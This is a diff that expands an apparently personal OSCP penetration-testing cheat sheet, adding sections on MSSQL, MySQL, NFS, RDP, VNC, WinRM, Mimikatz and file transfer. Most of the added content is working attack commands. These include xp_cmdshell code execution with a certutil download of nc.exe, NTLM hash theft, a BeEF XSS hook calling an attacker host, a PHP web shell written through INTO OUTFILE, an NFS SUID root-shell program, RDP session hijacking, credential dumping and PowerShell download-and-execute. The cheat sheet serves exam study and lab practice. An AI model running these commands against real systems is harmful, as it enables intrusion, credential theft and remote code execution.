@@ -28,7 +28,7 @@ description: "OSCP personal cheat sheet"
     + [Wordpress panel RCE](#wordpress-panel-rce)
   * [Drupal](#drupal)
     + [Username enumeration](#username-enumeration)
-    + [Hidden pages eumeration](#hidden-pages-eumeration)
+    + [Hidden pages enumeration](#hidden-pages-enumeration)
     + [Drupal panel RCE](#drupal-panel-rce)
   * [Joomla](#joomla)
   * [Tomcat](#tomcat)
@@ -36,7 +36,7 @@ description: "OSCP personal cheat sheet"
     + [Brute force](#brute-force-2)
     + [Tomcat panel RCE](#tomcat-panel-rce)
   * [WebDav](#webdav)
-  * [Spidering / Brute force directories/files](#spidering---brute-force-directories-files)
+  * [Spidering / Brute force directories / files](#spidering---brute-force-directories---files)
     + [File backups](#file-backups)
   * [Local File Inclusion / Remote File Inclusion - LFI / RFI](#local-file-inclusion---remote-file-inclusion---lfi---rfi)
     + [Tools](#tools)
@@ -48,6 +48,7 @@ description: "OSCP personal cheat sheet"
   * [Other web vulnerabilities](#other-web-vulnerabilities)
 - [KERBEROS - 88](#kerberos---88)
 - [POP3 - 110](#pop3---110)
+  * [Brute force](#brute-force-3)
   * [Read mail](#read-mail)
 - [SNMP - 161](#snmp---161)
   * [Brute force community string](#brute-force-community-string)
@@ -58,7 +59,7 @@ description: "OSCP personal cheat sheet"
 - [SMB - 445](#smb---445)
   * [Version if nmap didn't detect it](#version-if-nmap-didn-t-detect-it)
   * [Scans](#scans-1)
-  * [Brute force](#brute-force-3)
+  * [Brute force](#brute-force-4)
   * [Mount a SMB share](#mount-a-smb-share)
   * [Get a shell](#get-a-shell)
   * [EternalBlue](#eternalblue)
@@ -66,26 +67,54 @@ description: "OSCP personal cheat sheet"
     + [Prepare shellcodes and listeners](#prepare-shellcodes-and-listeners)
     + [Exploit](#exploit)
   * [If this doesn't work, try this one](#if-this-doesn-t-work--try-this-one)
+- [MSSQL - 1433](#mssql---1433)
+  * [Get information](#get-information)
+  * [Brute force](#brute-force-5)
+  * [Having credentials](#having-credentials)
 - [NFS - 2049](#nfs---2049)
   * [Show Mountable NFS Shares](#show-mountable-nfs-shares)
   * [Mount a share](#mount-a-share)
-  * [List NFS exported shares. If 'rw,no_root_squash' is present, connect, upload and execute suid-shell](#list-nfs-exported-shares-if--rw-no-root-squash--is-present--connect--upload-and-execute-suid-shell)
+  * [NFS misconfigurations](#nfs-misconfigurations)
+- [MYSQL - 3306](#mysql---3306)
+  * [Brute force](#brute-force-6)
+  * [Extracting MySQL credentials from files](#extracting-mysql-credentials-from-files)
+  * [Connect](#connect)
+  * [MySQL commands](#mysql-commands)
+  * [Useful files](#useful-files)
+    + [Linux](#linux)
+    + [Windows](#windows)
 - [RDP - 3389](#rdp---3389)
+  * [Brute force](#brute-force-7)
   * [Connect with known credentials / hash](#connect-with-known-credentials---hash)
-  * [Brute force](#brute-force-4)
+  * [Session stealing](#session-stealing)
+    + [Get openned sessions](#get-openned-sessions)
+    + [Access to the selected](#access-to-the-selected)
   * [Adding user to RDP group (Windows)](#adding-user-to-rdp-group--windows-)
+- [VNC - 5800 - 58001 - 5900 - 5901](#vnc---5800---58001---5900---5901)
+  * [Scans](#scans-2)
+  * [Brute force](#brute-force-8)
+  * [Connect](#connect-1)
+  * [Found VNC password](#found-vnc-password)
+    + [Linux](#linux-1)
+    + [Windows](#windows-1)
+  * [Decrypt VNC password](#decrypt-vnc-password)
 - [WINRM - 5985 - 5986](#winrm---5985---5986)
-  * [Brute force](#brute-force-5)
-- [DICTIONNARY GENERATION](#dictionnary-generation)
+  * [Brute force](#brute-force-9)
+  * [Connecting](#connecting)
+- [CGI](#cgi)
+  * [Found CGI scripts](#found-cgi-scripts)
+- [DICTIONARY GENERATION](#dictionary-generation)
 - [FILE TRANSFER](#file-transfer)
-  * [Linux](#linux)
-  * [Windows](#windows)
-- [HASHES](#hashes)
-  * [Windows](#windows-1)
-  * [Linux](#linux-1)
-- [MSFVENOM PAYLOAD](#msfvenom-payload)
   * [Linux](#linux-2)
   * [Windows](#windows-2)
+- [HASHES](#hashes)
+  * [Windows](#windows-3)
+  * [Linux](#linux-3)
+- [MIMIKATZ](#mimikatz)
+- [MISCELLANEOUS](#miscellaneous)
+- [MSFVENOM PAYLOAD](#msfvenom-payload)
+  * [Linux](#linux-4)
+  * [Windows](#windows-4)
   * [PHP](#php)
   * [ASP](#asp)
   * [JSP](#jsp)
@@ -105,12 +134,14 @@ description: "OSCP personal cheat sheet"
     + [Rules](#rules)
   * [John](#john)
 - [PIVOTING](#pivoting)
-  * [sshuttle](#sshuttle)
+  * [Sshuttle](#sshuttle)
   * [Proxychains](#proxychains)
 - [PRIVILE ESCALATION](#privile-escalation)
-  * [Linux](#linux-3)
+  * [Linux](#linux-5)
     + [Enumeration scripts](#enumeration-scripts)
-  * [Windows](#windows-3)
+  * [Windows](#windows-5)
+  * [Enumeration scripts](#enumeration-scripts-1)
+  * [JuicyPotato](#juicypotato)
 - [REVERSE SHELL](#reverse-shell)
   * [Bash](#bash-1)
   * [Perl](#perl-1)
@@ -122,6 +153,8 @@ description: "OSCP personal cheat sheet"
 - [SHELLSHOCK](#shellshock)
 - [USEFUL LINUX COMMANDS](#useful-linux-commands)
 - [USEFUL WINDOWS COMMANDS](#useful-windows-commands)
+- [ZIP](#zip)
+  * [Brute force](#brute-force-10)
 
 ------
 
@@ -257,6 +290,7 @@ finger "|/bin/ls -a /<IP>"
 
 ```
 nikto -h <URL>
+python crawleet.py -u <URL> -b -d 3 -e jpg,png,css -f -m -s -x php,txt -y --threads 20
 ```
 
 ### Wordpress
@@ -346,7 +380,7 @@ admin:tomcat
 #### Brute force 
 
 ```
-hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> -f <IP> http-get /manager/html -vV
 ```
 
 #### Tomcat panel RCE
@@ -370,7 +404,7 @@ wget http://<IP>:8080/shell
 davtest -url <URL>
 ```
 
-### Spidering / Brute force directories/files
+### Spidering / Brute force directories / files
 
 ```
 gospider -d <DEPTHS> --robots --sitemap -t <THREADS> -s <URL>
@@ -429,12 +463,18 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecur
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
 ```
 
 ### XSS
 
 ```
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+beef-xss
+cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
+<script src="http://<IP>:3000/hook.js"></script>
 ```
 
 ### Other web vulnerabilities
@@ -471,6 +511,7 @@ USER <USER>
 PASS <PASSWORD>
 LIST
 RETR <MAIL_NUMBER>
+QUIT
 ```
 
 ------
@@ -620,6 +661,43 @@ python zzz_exploit.py <IP>
 
 ------
 
+## MSSQL - 1433
+
+### Get information
+
+```
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+```
+
+### Brute force
+
+```
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
+```
+
+### Having credentials
+
+```
+mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
+mssqlclient.py <USER>:<PASSWORD>@<IP>
+
+# Once logged in you can run queries:
+SQL> select @@ version;
+
+# Steal NTLM hash
+sudo smbserver.py -smb2support liodeus .
+SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
+
+# Try to enable code execution
+SQL> enable_xp_cmdshell
+
+# Execute code
+SQL> xp_cmdshell whoami /all
+SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+```
+
+------
+
 ## NFS - 2049
 
 ### Show Mountable NFS Shares
@@ -633,19 +711,115 @@ nmap --script=nfs-showmount -oN mountable_shares <IP>
 
 ```
 sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
 ```
 
-### List NFS exported shares. If 'rw,no_root_squash' is present, connect, upload and execute suid-shell
+### NFS misconfigurations
 
 ```
+# List exported shares
+cat /etc/exports
+```
+
+If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.
+
+```
+# Attacker, as root user
+
+mkdir <DIRECTORY>
+mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+cd <DIRECTORY>
 echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
 gcc pwn.c -o pwn
 chmod +s pwn
+
+# Victim
+
+cd <SHARE>
+./pwn # Root shell
+```
+
+------
+
+## MYSQL - 3306
+
+### Brute force
+
+```
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
+```
+
+### Extracting MySQL credentials from files
+
+```
+cat /etc/mysql/debian.cnf
+grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+```
+
+### Connect
+
+```
+# Local
+mysql -u <USER>
+mysql -u <USER> -p
+
+# Remote
+mysql -h <IP> -u <USER>
+```
+
+### MySQL commands
+
+```
+show databases;
+use <DATABASES>;
+
+show tables;
+describe <TABLE>;
+
+select * from <TABLE>;
+
+# Try to execute code
+select do_system('id');
+\! sh
+
+# Read & Write
+select load_file('<FILE>');
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
+```
+
+### Useful files
+
+#### Linux
+
+```
+/etc/my.cnf
+/etc/mysql/my.cnf
+/var/lib/mysql/my.cnf
+~/.my.cnf
+/etc/my.cnf
+```
+
+#### Windows
+
+```
+config.ini
+my.ini
+windows\my.ini
+winnt\my.ini
 ```
 
 ------
 
 ## RDP - 3389
+
+### Brute force
+
+```
+crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
+crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
+
+hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
+```
 
 ### Connect with known credentials / hash
 
@@ -657,19 +831,81 @@ xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
 xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
 ```
 
-### Brute force
+### Session stealing
+
+#### Get openned sessions
 
 ```
-crowbar -b rdp -s <IP>/CIDR -u <USER> -C <PASSWORDS_LIST>
-crowbar -b rdp -s <IP>/CIDR -U <USERS_LIST> -C <PASSWORDS_LIST>
+query user
+```
 
-hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP>
+#### Access to the selected 
+
+```
+tscon <ID> /dest:<SESSIONNAME>
 ```
 
 ### Adding user to RDP group (Windows) 
 
 ```
 net localgroup "Remote Desktop Users" <USER> /add
+```
+
+------
+
+## VNC - 5800 - 58001 - 5900 - 5901
+
+### Scans
+
+``` 
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
+```
+
+### Brute force
+
+```
+hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
+```
+
+### Connect
+
+```
+vncviewer <IP>:<PORT>
+```
+
+### Found VNC password
+
+#### Linux
+
+```
+Default password is stored in: ~/.vnc/passwd
+```
+
+#### Windows
+
+```
+# RealVNC
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
+
+# TightVNC
+HKEY_CURRENT_USER\Software\TightVNC\Server
+
+# TigerVNC
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
+
+# UltraVNC
+C:\Program Files\UltraVNC\ultravnc.ini
+```
+
+### Decrypt VNC password
+
+```
+msfconsole
+irb
+fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+require 'rex/proto/rfb'
+Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
+/dev/nul
 ```
 
 ------
@@ -681,6 +917,27 @@ net localgroup "Remote Desktop Users" <USER> /add
 ```
 crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 ```
+
+### Connecting
+
+```
+evil-winrm -i <IP> -u <USER> -p <PASSWORD>
+evil-winrm -i <IP> -u <USER> -H <HASH>
+```
+
+------
+
+## CGI
+
+### Found CGI scripts
+
+```
+ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <URL>/ccgi-bin/FUZZ -t 50
+ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <URL>/ccgi-bin/FUZZ -t 50
+ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <URL>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
+```
+
+If a script is found try [SHELLSHOCK](#shellshock).
 
 ------
 
@@ -701,18 +958,59 @@ crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o pas
 ### Linux
 
 ```
-python -m SimpleHTTPServer
+# PYTHON
+python -m SimpleHTTPServer <PORT>
+python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
+
+# FTP
 sudo python3 -m pyftpdlib  -p 21 -w
+
+# SMB
 sudo smbserver.py -smb2support liodeus .
-wget <URL>
-curl <URL>
+
+# WGET
+wget <URL> -o <OUT_FILE>
+
+# CURL
+curl <URL> -o <OUT_FILE>
+
+# NETCAT
+nc -lvp 1234 > <OUT_FILE> 
+nc <IP> 1234 < <IN_FILE> 
+
+# SCP
+scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
 ```
-
-
 
 ### Windows
 
+```
+# FTP 
+echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
+ftp -v -n -s:ftp.txt
 
+# SMB
+copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
+copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
+
+# Powershell
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
+powershell "wget <URL>"
+
+# Python
+python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
+
+# CertUtil
+certutil.exe -urlcache -split -f "<URL>"
+
+# NETCAT
+nc -lvp 1234 > <OUT_FILE> 
+nc <IP> 1234 < <IN_FILE>
+
+# CURL
+curl <URL> -o <OUT_FILE>
+```
 
 ------
 
@@ -735,16 +1033,42 @@ unshadow passwd shadow > hashes
 
 ------
 
-## Miscellaneous
+## MIMIKATZ
 
 ```
-Get path without space (windows 8)
+privilege::debug
+```
 
+```
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+kerberos::list /export
+
+vault::cred
+vault::list
+
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+```
+
+------
+
+## MISCELLANEOUS
+
+Get a Windows path without spaces
+
+```
+# path.cmd
 @echo off
 echo %~s1
+
+path.cmd "C:\Program Files (x86)\Common Files\test.txt"
+C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
 ```
 
-
+------
 
 ## MSFVENOM PAYLOAD
 
@@ -873,7 +1197,7 @@ john --wordlist=<PASSWORDS_LIST> hash.txt
 
 ## PIVOTING
 
-### sshuttle
+### Sshuttle
 
 ```
 sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
@@ -904,7 +1228,17 @@ proxychains <COMMAND>
 
 ### Windows
 
+### Enumeration scripts
 
+```
+
+```
+
+### JuicyPotato
+
+```
+
+```
 
 ------
 
@@ -984,3 +1318,17 @@ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL
 ```
 
 ```
+
+------
+
+## ZIP
+
+### Brute force
+
+```
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
+
+zip2john file.zip > zip.john
+john --wordlist=<PASSWORDS_LIST> zip.john
+```
+
